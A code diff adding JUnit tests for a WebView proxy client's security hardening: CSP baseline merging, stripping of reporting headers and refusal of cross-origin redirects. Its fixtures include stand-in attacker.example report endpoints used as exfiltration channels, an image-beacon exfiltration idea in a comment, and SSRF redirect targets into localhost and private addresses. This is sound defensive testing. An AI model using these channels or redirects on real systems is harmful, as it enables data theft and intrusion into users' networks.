@@ -13,11 +13,237 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Arrays;
 import java.util.HashMap;
+import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import org.junit.Test;
 
 public class QdnBridgeWebViewClientTest {
+
+    @Test
+    public void injectedHtmlPreservesNodeCspAndAppendsHomesBaseline() {
+        Map<String, String> headers = new LinkedHashMap<>();
+        String upstream =
+            "default-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
+            "img-src 'self' data: blob:; connect-src 'self' wss: blob:;";
+        String secondUpstreamPolicy = "object-src 'none';";
+        String legacy = "default-src 'self';";
+
+        headers.put("content-security-policy", upstream);
+        headers.put("Content-Security-Policy", secondUpstreamPolicy);
+        headers.put("X-Content-Security-Policy", legacy);
+        headers.put("content-length", "1234");
+        headers.put("Content-Encoding", "gzip");
+        headers.put("TRANSFER-ENCODING", "chunked");
+        headers.put("referrer-policy", "unsafe-url");
+
+        Map<String, String> prepared = QdnBridgeWebViewClient.prepareInjectedHtmlResponseHeaders(
+            QdnBridgeWebViewClient.prepareProxiedResponseHeaders(headers)
+        );
+
+        assertEquals(
+            upstream + ", " + secondUpstreamPolicy + ", " +
+                QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY,
+            prepared.get("Content-Security-Policy")
+        );
+        assertEquals(legacy, prepared.get("X-Content-Security-Policy"));
+        assertEquals("no-referrer", prepared.get("Referrer-Policy"));
+        assertFalse(prepared.containsKey("referrer-policy"));
+        assertFalse(prepared.containsKey("content-length"));
+        assertFalse(prepared.containsKey("Content-Encoding"));
+        assertFalse(prepared.containsKey("TRANSFER-ENCODING"));
+        assertFalse(QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY.contains(" ws:"));
+        assertFalse(QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY.contains(" wss:"));
+    }
+
+    @Test
+    public void injectedHtmlGetsTheFullMinimumPolicyWhenTheNodeOmitsModernCsp() {
+        Map<String, String> headers = new HashMap<>();
+        headers.put("X-Content-Security-Policy", "default-src 'self';");
+
+        Map<String, String> prepared =
+            QdnBridgeWebViewClient.prepareProxiedResponseHeaders(headers);
+
+        // The legacy X- header is NOT a modern policy and WebView does not
+        // enforce it, so there is nothing here for a connection-only policy to
+        // intersect with: Home must supply the whole sandbox.
+        assertEquals(
+            QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY,
+            prepared.get("Content-Security-Policy")
+        );
+        assertEquals("default-src 'self';", prepared.get("X-Content-Security-Policy"));
+    }
+
+    @Test
+    public void nonInjectedProxyResponsesAlsoGetTheHomePolicy() {
+        for (String contentType : Arrays.asList("text/html", "text/javascript", "application/wasm")) {
+            Map<String, String> headers = new HashMap<>();
+            headers.put("Content-Type", contentType);
+
+            Map<String, String> prepared =
+                QdnBridgeWebViewClient.prepareProxiedResponseHeaders(headers);
+
+            assertEquals(
+                contentType + " proxy response must receive the Home CSP",
+                QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY,
+                prepared.get("Content-Security-Policy")
+            );
+        }
+    }
+
+    @Test
+    public void aNodeThatOmitsCspDoesNotGetAWEAKERSandboxThanOneThatSetsIt() {
+        // The point of the minimum policy. A connection-only policy would leave
+        // <img src="https://attacker/?d=…"> available — a beacon that needs no
+        // WebSocket and no fetch — so a node that simply omits the header would
+        // end up LESS constrained than one that sets a policy. Home connects to
+        // public nodes it does not control, so that is a live threat, not a
+        // hypothetical.
+        Map<String, String> noUpstream =
+            QdnBridgeWebViewClient.prepareProxiedResponseHeaders(new HashMap<>());
+        String policy = noUpstream.get("Content-Security-Policy");
+        for (String directive : Arrays.asList("img-src", "media-src", "font-src", "worker-src",
+                "default-src", "connect-src")) {
+            assertTrue(
+                directive + " must be bounded when the node supplies no policy",
+                policy.contains(directive)
+            );
+        }
+        // And it names no external origin.
+        assertFalse(policy.contains("http://"));
+        assertFalse(policy.contains("https://"));
+        assertFalse(policy.contains(" ws:"));
+        assertFalse(policy.contains(" wss:"));
+    }
+
+    @Test
+    public void aRedirectOffTheAuthorizedOriginIsNotFollowed() throws Exception {
+        // The SSRF this closes: a public node answers an ordinary app request
+        // with a redirect into the user's own network, and the proxy — running
+        // on the user's device, inside that network — fetches it and hands the
+        // body back as the app's same-origin content.
+        java.net.URL authorized = new java.net.URL("http://node.example:12391/render/APP/Demo");
+
+        for (String hostile : Arrays.asList(
+            "http://127.0.0.1:12391/admin/stop",
+            "http://192.168.1.1/",
+            "http://[::1]:12391/",
+            "http://node.example.attacker.test:12391/",
+            "http://node.example:9999/",
+            "https://node.example:12391/"
+        )) {
+            assertFalse(
+                hostile + " must not be followed",
+                QdnBridgeWebViewClient.isSameOrigin(authorized, new java.net.URL(hostile))
+            );
+        }
+    }
+
+    @Test
+    public void anOrdinarySameOriginRedirectStillWorks() throws Exception {
+        // Refusing every redirect would break Core's own directory-style
+        // responses, so the rule is same-origin, not none.
+        java.net.URL authorized = new java.net.URL("http://node.example:12391/render/APP/Demo");
+
+        assertTrue(QdnBridgeWebViewClient.isSameOrigin(
+            authorized, new java.net.URL("http://node.example:12391/render/APP/Demo/")));
+        assertTrue("host comparison is case-insensitive", QdnBridgeWebViewClient.isSameOrigin(
+            authorized, new java.net.URL("http://NODE.EXAMPLE:12391/render/APP/Demo/")));
+        // An omitted default port is the same origin as the explicit one.
+        assertTrue(QdnBridgeWebViewClient.isSameOrigin(
+            new java.net.URL("http://node.example/a"), new java.net.URL("http://node.example:80/b")));
+    }
+
+    @Test
+    public void aHostilePermissivePolicyDoesNotSuppressHomesBaseline() {
+        // The finding that made the baseline unconditional. A hostile node can
+        // send a NONEMPTY but wide-open policy; treating "a CSP field exists"
+        // as "Core's sandbox is present" trusts exactly the party the policy
+        // exists to contain.
+        Map<String, String> headers = new HashMap<>();
+        headers.put("Content-Security-Policy", "default-src * data: blob: 'unsafe-inline';");
+
+        String policy = QdnBridgeWebViewClient
+            .prepareProxiedResponseHeaders(headers)
+            .get("Content-Security-Policy");
+
+        assertTrue("the hostile policy is retained", policy.contains("default-src * data:"));
+        assertTrue("and Home's baseline still applies", policy.contains("img-src 'self' data: blob:"));
+        assertTrue(policy.endsWith(QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY));
+    }
+
+    @Test
+    public void reportingIsNotLeftAsAnEgressChannel() {
+        // A violation report is sent by the BROWSER, so connect-src does not
+        // constrain it: report-only plus 'report-sample' turns CSP itself into
+        // a data channel out to whatever report-uri the node names.
+        Map<String, String> headers = new HashMap<>();
+        headers.put("Content-Security-Policy",
+            "default-src 'self'; report-uri https://attacker.example/csp;");
+        headers.put("Content-Security-Policy-Report-Only",
+            "script-src 'none' 'report-sample'; report-uri https://attacker.example/csp;");
+        headers.put("Report-To", "{\"endpoints\":[{\"url\":\"https://attacker.example/r\"}]}");
+        headers.put("Reporting-Endpoints", "csp=\"https://attacker.example/r\"");
+        headers.put("NEL", "{\"report_to\":\"csp\"}");
+
+        Map<String, String> prepared = QdnBridgeWebViewClient.prepareProxiedResponseHeaders(headers);
+
+        for (String dropped : Arrays.asList("Content-Security-Policy-Report-Only", "Report-To",
+                "Reporting-Endpoints", "NEL")) {
+            assertFalse(dropped + " must not survive", prepared.containsKey(dropped));
+        }
+        String policy = prepared.get("Content-Security-Policy");
+        assertFalse("report-uri must be stripped from retained policies",
+            policy.contains("attacker.example"));
+        assertTrue("the rest of the policy survives", policy.contains("default-src 'self'"));
+    }
+
+    @Test
+    public void theBaselineCoversDirectivesThatDoNotFallBackToDefaultSrc() {
+        // form-action, base-uri, object-src and webrtc do NOT inherit from
+        // default-src. An auto-submitted POST form is an egress channel that
+        // needs no fetch and no WebSocket, and Android does not call
+        // shouldOverrideUrlLoading for POST.
+        String policy = QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY;
+        assertTrue(policy.contains("form-action 'self'"));
+        assertTrue(policy.contains("base-uri 'self'"));
+        assertTrue(policy.contains("object-src 'none'"));
+        assertTrue(policy.contains("webrtc 'block'"));
+    }
+
+    @Test
+    public void anUpstreamPolicyIsIntersectedRatherThanReplaced() {
+        Map<String, String> headers = new HashMap<>();
+        headers.put("Content-Security-Policy", "default-src 'self'; img-src https://node.example;");
+
+        String policy = QdnBridgeWebViewClient
+            .prepareProxiedResponseHeaders(headers)
+            .get("Content-Security-Policy");
+
+        // Core's policy survives — Home does not weaken what the node asked for
+        // — and Home's connection policy is appended as a second, independent
+        // policy, which the browser enforces as an intersection.
+        assertTrue(policy.startsWith("default-src 'self'; img-src https://node.example;"));
+        assertTrue(policy.endsWith(QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY));
+    }
+
+    @Test
+    public void repeatedModernCspHeadersRemainIndependentPolicies() {
+        assertEquals(
+            "default-src 'self';, img-src 'self' data:;",
+            QdnBridgeWebViewClient.serializeResponseHeaderValue(
+                "content-security-policy",
+                Arrays.asList("default-src 'self';", "img-src 'self' data:;")
+            )
+        );
+        assertEquals(
+            "first",
+            QdnBridgeWebViewClient.serializeResponseHeaderValue(
+                "Cache-Control",
+                Arrays.asList("first", "second")
+            )
+        );
+    }
 
     @Test
     public void homeV2BridgeAddsSeparateQortalRequestWithoutChangingProductionBridge() {
